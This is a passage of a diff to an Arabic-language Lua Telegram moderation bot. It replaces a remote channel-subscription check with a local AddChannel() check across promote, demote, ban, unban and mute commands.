-send(msg.chat_id_,msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• [@Source_Milano] ⚜️')   
-return false 
+if text == ("تنزيل مدير") and tonumber(msg.reply_to_message_id_) ~= 0 and Constructor(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
 end
 function Function_LARViN(extra, result, success)
 database:srem(bot_id.."LARViN:Manager"..msg.chat_id_, result.sender_user_id_)
@@ -2456,12 +2929,15 @@ end
 tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_LARViN, nil)
 return false
 end  
-if text and text:match("^تنزيل مدير @(.*)$") and Constructor(msg) then 
-local url,res = http.request('http://LARViN.ml/joinch/?id='..msg.sender_user_id_)
-data = JSON.decode(url)
-if data.Ch_Member.LARViN == 0 then
-send(msg.chat_id_,msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• [@Source_Milano] ⚜️')   
-return false 
+if text and text:match("^تنزيل مدير @(.*)$") and Constructor(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
 end
 local username = text:match("^تنزيل مدير @(.*)$")
 function Function_LARViN(extra, result, success)
@@ -2475,12 +2951,15 @@ end
 tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_LARViN, nil)
 return false
 end  
-if text and text:match("^تنزيل مدير (%d+)$") and Constructor(msg) then 
-local url,res = http.request('http://LARViN.ml/joinch/?id='..msg.sender_user_id_)
-data = JSON.decode(url)
-if data.Ch_Member.LARViN == 0 then
-send(msg.chat_id_,msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• [@Source_Milano] ⚜️')   
-return false 
+if text and text:match("^تنزيل مدير (%d+)$") and Constructor(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
 end
 local userid = text:match("^تنزيل مدير (%d+)$") 
 database:srem(bot_id.."LARViN:Manager"..msg.chat_id_, userid)
@@ -2488,12 +2967,15 @@ Reply_Status(msg,userid,"reply","💢┇تم تنزيله من المدراء")
 return false
 end
 
-if text == ("رفع ادمن") and tonumber(msg.reply_to_message_id_) ~= 0 and Owner(msg) then 
-local url,res = http.request('http://LARViN.ml/joinch/?id='..msg.sender_user_id_)
-data = JSON.decode(url)
-if data.Ch_Member.LARViN == 0 then
-send(msg.chat_id_,msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• [@Source_Milano] ⚜️')   
-return false 
+if text == ("رفع ادمن") and tonumber(msg.reply_to_message_id_) ~= 0 and Owner(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
 end
 if not Constructor(msg) and database:get(bot_id.."Add:Group:Cheking"..msg.chat_id_) then 
 send(msg.chat_id_, msg.id_,'✖┇لا تستطيع رفع احد وذالك لان تم تعطيل الرفع من قبل المنشئين')
@@ -2506,12 +2988,15 @@ end
 tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_LARViN, nil)
 return false
 end
-if text and text:match("^رفع ادمن @(.*)$") and Owner(msg) then 
-local url,res = http.request('http://LARViN.ml/joinch/?id='..msg.sender_user_id_)
-data = JSON.decode(url)
-if data.Ch_Member.LARViN == 0 then
-send(msg.chat_id_,msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• [@Source_Milano] ⚜️')   
-return false 
+if text and text:match("^رفع ادمن @(.*)$") and Owner(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
 end
 local username = text:match("^رفع ادمن @(.*)$")
 if not Constructor(msg) and database:get(bot_id.."Add:Group:Cheking"..msg.chat_id_) then 
@@ -2533,12 +3018,15 @@ end
 tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_LARViN, nil)
 return false
 end
-if text and text:match("^رفع ادمن (%d+)$") and Owner(msg) then 
-local url,res = http.request('http://LARViN.ml/joinch/?id='..msg.sender_user_id_)
-data = JSON.decode(url)
-if data.Ch_Member.LARViN == 0 then
-send(msg.chat_id_,msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• [@Source_Milano] ⚜️')   
-return false 
+if text and text:match("^رفع ادمن (%d+)$") and Owner(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
 end
 local userid = text:match("^رفع ادمن (%d+)$")
 if not Constructor(msg) and database:get(bot_id.."Add:Group:Cheking"..msg.chat_id_) then 
@@ -2549,12 +3037,15 @@ database:sadd(bot_id.."LARViN:Mod:User"..msg.chat_id_, userid)
 Reply_Status(msg,userid,"reply","💢┇تم ترقيته ادمن للمجموعه")  
 return false
 end
-if text == ("تنزيل ادمن") and tonumber(msg.reply_to_message_id_) ~= 0 and Owner(msg) then 
-local url,res = http.request('http://LARViN.ml/joinch/?id='..msg.sender_user_id_)
-data = JSON.decode(url)
-if data.Ch_Member.LARViN == 0 then
-send(msg.chat_id_,msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• [@Source_Milano] ⚜️')   
-return false 
+if text == ("تنزيل ادمن") and tonumber(msg.reply_to_message_id_) ~= 0 and Owner(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
 end
 function Function_LARViN(extra, result, success)
 database:srem(bot_id.."LARViN:Mod:User"..msg.chat_id_, result.sender_user_id_)
@@ -2563,12 +3054,15 @@ end
 tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_LARViN, nil)
 return false
 end
-if text and text:match("^تنزيل ادمن @(.*)$") and Owner(msg) then 
-local url,res = http.request('http://LARViN.ml/joinch/?id='..msg.sender_user_id_)
-data = JSON.decode(url)
-if data.Ch_Member.LARViN == 0 then
-send(msg.chat_id_,msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• [@Source_Milano] ⚜️')   
-return false 
+if text and text:match("^تنزيل ادمن @(.*)$") and Owner(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
 end
 local username = text:match("^تنزيل ادمن @(.*)$") 
 function Function_LARViN(extra, result, success)
@@ -2582,12 +3076,15 @@ end
 tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_LARViN, nil)
 return false
 end
-if text and text:match("^تنزيل ادمن (%d+)$") and Owner(msg) then 
-local url,res = http.request('http://LARViN.ml/joinch/?id='..msg.sender_user_id_)
-data = JSON.decode(url)
-if data.Ch_Member.LARViN == 0 then
-send(msg.chat_id_,msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• [@Source_Milano] ⚜️')   
-return false 
+if text and text:match("^تنزيل ادمن (%d+)$") and Owner(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
 end
 local userid = text:match("^تنزيل ادمن (%d+)$")
 database:srem(bot_id.."LARViN:Mod:User"..msg.chat_id_, userid)
@@ -2595,12 +3092,15 @@ Reply_Status(msg,userid,"reply","💢┇تم تنزيله من ادمنيه ال
 return false
 end
 
-if text == ("رفع مميز") and tonumber(msg.reply_to_message_id_) ~= 0 and Addictive(msg) then 
-local url,res = http.request('http://LARViN.ml/joinch/?id='..msg.sender_user_id_)
-data = JSON.decode(url)
-if data.Ch_Member.LARViN == 0 then
-send(msg.chat_id_,msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• [@Source_Milano] ⚜️')   
-return false 
+if text == ("رفع مميز") and tonumber(msg.reply_to_message_id_) ~= 0 and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
 end
 if not Constructor(msg) and database:get(bot_id.."Add:Group:Cheking"..msg.chat_id_) then 
 send(msg.chat_id_, msg.id_,'✖┇لا تستطيع رفع احد وذالك لان تم تعطيل الرفع من قبل المنشئين')
@@ -2613,12 +3113,15 @@ end
 tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_LARViN, nil)
 return false
 end
-if text and text:match("^رفع مميز @(.*)$") and Addictive(msg) then 
-local url,res = http.request('http://LARViN.ml/joinch/?id='..msg.sender_user_id_)
-data = JSON.decode(url)
-if data.Ch_Member.LARViN == 0 then
-send(msg.chat_id_,msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• [@Source_Milano] ⚜️')   
-return false 
+if text and text:match("^رفع مميز @(.*)$") and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
 end
 local username = text:match("^رفع مميز @(.*)$") 
 if not Constructor(msg) and database:get(bot_id.."Add:Group:Cheking"..msg.chat_id_) then 
@@ -2641,12 +3144,15 @@ tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_LARViN,
 return false
 end
 
-if text and text:match("^رفع مميز (%d+)$") and Addictive(msg) then 
-local url,res = http.request('http://LARViN.ml/joinch/?id='..msg.sender_user_id_)
-data = JSON.decode(url)
-if data.Ch_Member.LARViN == 0 then
-send(msg.chat_id_,msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• [@Source_Milano] ⚜️')   
-return false 
+if text and text:match("^رفع مميز (%d+)$") and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
 end
 local userid = text:match("^رفع مميز (%d+)$")
 if not Constructor(msg) and database:get(bot_id.."Add:Group:Cheking"..msg.chat_id_) then 
@@ -2658,12 +3164,15 @@ Reply_Status(msg,userid,"reply","💢┇تم ترقيته مميز للمجمو�
 return false
 end
 
-if (text == ("تنزيل مميز")) and tonumber(msg.reply_to_message_id_) ~= 0 and Addictive(msg) then 
-local url,res = http.request('http://LARViN.ml/joinch/?id='..msg.sender_user_id_)
-data = JSON.decode(url)
-if data.Ch_Member.LARViN == 0 then
-send(msg.chat_id_,msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• [@Source_Milano] ⚜️')   
-return false 
+if (text == ("تنزيل مميز")) and tonumber(msg.reply_to_message_id_) ~= 0 and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
 end
 function Function_LARViN(extra, result, success)
 database:srem(bot_id.."LARViN:Special:User"..msg.chat_id_, result.sender_user_id_)
@@ -2672,12 +3181,15 @@ end
 tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_LARViN, nil)
 return false
 end
-if text and text:match("^تنزيل مميز @(.*)$") and Addictive(msg) then 
-local url,res = http.request('http://LARViN.ml/joinch/?id='..msg.sender_user_id_)
-data = JSON.decode(url)
-if data.Ch_Member.LARViN == 0 then
-send(msg.chat_id_,msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• [@Source_Milano] ⚜️')   
-return false 
+if text and text:match("^تنزيل مميز @(.*)$") and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
 end
 local username = text:match("^تنزيل مميز @(.*)$") 
 function Function_LARViN(extra, result, success)
@@ -2691,25 +3203,31 @@ end
 tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_LARViN, nil)
 return false
 end
-if text and text:match("^تنزيل مميز (%d+)$") and Addictive(msg) then 
-local url,res = http.request('http://LARViN.ml/joinch/?id='..msg.sender_user_id_)
-data = JSON.decode(url)
-if data.Ch_Member.LARViN == 0 then
-send(msg.chat_id_,msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• [@Source_Milano] ⚜️')   
-return false 
+if text and text:match("^تنزيل مميز (%d+)$") and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
 end
 local userid = text:match("^تنزيل مميز (%d+)$") 
 database:srem(bot_id.."LARViN:Special:User"..msg.chat_id_, userid)
 Reply_Status(msg,userid,"reply","💢┇تم تنزيله من المميزين")  
 return false
 end  
-if text and text:match("رفع (.*)") and tonumber(msg.reply_to_message_id_) > 0 and Addictive(msg) then 
-local url,res = http.request('http://LARViN.ml/joinch/?id='..msg.sender_user_id_)
-data = JSON.decode(url)
-if data.Ch_Member.LARViN == 0 then
-send(msg.chat_id_,msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• [@Source_Milano] ⚜️')   
-return false 
-end 
+if text and text:match("رفع (.*)") and tonumber(msg.reply_to_message_id_) > 0 and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 local RTPA = text:match("رفع (.*)")
 if database:sismember(bot_id.."LARViN:Coomds"..msg.chat_id_,RTPA) then
 function by_reply(extra, result, success)   
@@ -2735,13 +3253,16 @@ end
 tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
 end
 end
-if text and text:match("تنزيل (.*)") and tonumber(msg.reply_to_message_id_) > 0 and Addictive(msg) then 
-local url,res = http.request('http://LARViN.ml/joinch/?id='..msg.sender_user_id_)
-data = JSON.decode(url)
-if data.Ch_Member.LARViN == 0 then
-send(msg.chat_id_,msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• [@Source_Milano] ⚜️')   
-return false 
-end 
+if text and text:match("تنزيل (.*)") and tonumber(msg.reply_to_message_id_) > 0 and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 local RTPA = text:match("تنزيل (.*)")
 if database:sismember(bot_id.."LARViN:Coomds"..msg.chat_id_,RTPA) then
 function by_reply(extra, result, success)   
@@ -2767,13 +3288,16 @@ end
 tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
 end
 end
-if text and text:match("^رفع (.*) @(.*)") and Addictive(msg) then 
-local url,res = http.request('http://LARViN.ml/joinch/?id='..msg.sender_user_id_)
-data = JSON.decode(url)
-if data.Ch_Member.LARViN == 0 then
-send(msg.chat_id_,msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• [@Source_Milano] ⚜️')   
-return false 
-end 
+if text and text:match("^رفع (.*) @(.*)") and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 local text1 = {string.match(text, "^(رفع) (.*) @(.*)$")}
 if database:sismember(bot_id.."LARViN:Coomds"..msg.chat_id_,text1[2]) then
 function py_username(extra, result, success)   
@@ -2802,13 +3326,16 @@ end
 tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},py_username,nil) 
 end 
 end
-if text and text:match("^تنزيل (.*) @(.*)") and Addictive(msg) then 
-local url,res = http.request('http://LARViN.ml/joinch/?id='..msg.sender_user_id_)
-data = JSON.decode(url)
-if data.Ch_Member.LARViN == 0 then
-send(msg.chat_id_,msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• [@Source_Milano] ⚜️')   
-return false 
-end 
+if text and text:match("^تنزيل (.*) @(.*)") and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 local text1 = {string.match(text, "^(تنزيل) (.*) @(.*)$")}
 if database:sismember(bot_id.."LARViN:Coomds"..msg.chat_id_,text1[2]) then
 function py_username(extra, result, success)   
@@ -2838,7 +3365,16 @@ tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},py_username,nil)
 end  
 end
 
-if text == ("حظر") and msg.reply_to_message_id_ ~= 0 and Addictive(msg) then
+if text == ("حظر") and msg.reply_to_message_id_ ~= 0 and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 if not Constructor(msg) and database:get(bot_id.."Ban:Cheking"..msg.chat_id_) then 
 send(msg.chat_id_, msg.id_,'💢┇لقد تم تعطيل الحظر و الطرد من قبل المنشئين')
 return false
@@ -2866,7 +3402,16 @@ tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumbe
 return false
 end
 
-if text and text:match("^حظر @(.*)$") and Addictive(msg) then
+if text and text:match("^حظر @(.*)$") and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 local username = text:match("^حظر @(.*)$")
 if not Constructor(msg) and database:get(bot_id.."Ban:Cheking"..msg.chat_id_) then 
 send(msg.chat_id_, msg.id_,'💢┇لقد تم تعطيل الحظر و الطرد من قبل المنشئين')
@@ -2903,7 +3448,16 @@ tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_LARViN,
 return false
 end
 
-if text and text:match("^حظر (%d+)$") and Addictive(msg) then
+if text and text:match("^حظر (%d+)$") and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 local userid = text:match("^حظر (%d+)$") 
 if not Constructor(msg) and database:get(bot_id.."Ban:Cheking"..msg.chat_id_) then 
 send(msg.chat_id_, msg.id_,'💢┇لقد تم تعطيل الحظر و الطرد من قبل المنشئين')
@@ -2928,7 +3482,16 @@ end,nil)
 end
 return false
 end
-if text == ("الغاء حظر") and tonumber(msg.reply_to_message_id_) ~= 0 and Addictive(msg) then
+if text == ("الغاء حظر") and tonumber(msg.reply_to_message_id_) ~= 0 and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 function Function_LARViN(extra, result, success)
 if tonumber(result.sender_user_id_) == tonumber(bot_id) then
 send(msg.chat_id_, msg.id_, "☑️┇انا لست محظورا \n") 
@@ -2942,7 +3505,16 @@ tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumbe
 return false
 end
  
-if text and text:match("^الغاء حظر @(.*)$") and Addictive(msg) then
+if text and text:match("^الغاء حظر @(.*)$") and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 local username = text:match("^الغاء حظر @(.*)$") 
 function Function_LARViN(extra, result, success)
 if result.id_ then
@@ -2961,7 +3533,16 @@ tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_LARViN,
 return false
 end
 
-if text and text:match("^الغاء حظر (%d+)$") and Addictive(msg) then
+if text and text:match("^الغاء حظر (%d+)$") and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 local userid = text:match("^الغاء حظر (%d+)$") 
 if tonumber(userid) == tonumber(bot_id) then
 send(msg.chat_id_, msg.id_, "☑️┇انا لست محظورا \n") 
@@ -2973,7 +3554,16 @@ Reply_Status(msg,userid,"reply","💢┇تم الغاء حظره من هنا")
 return false
 end
 
-if text == ("كتم") and msg.reply_to_message_id_ ~= 0 and Addictive(msg) then
+if text == ("كتم") and msg.reply_to_message_id_ ~= 0 and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 function Function_LARViN(extra, result, success)
 if Rank_Checking(result.sender_user_id_, msg.chat_id_) == true then
 send(msg.chat_id_, msg.id_, "\n💢┇عذرا لا تستطيع طرد او حظر او كتم او تقييد ( "..Get_Rank(result.sender_user_id_,msg.chat_id_).." )")
@@ -2989,7 +3579,16 @@ end
 tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_LARViN, nil)
 return false
 end
-if text and text:match("^كتم @(.*)$") and Addictive(msg) then
+if text and text:match("^كتم @(.*)$") and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
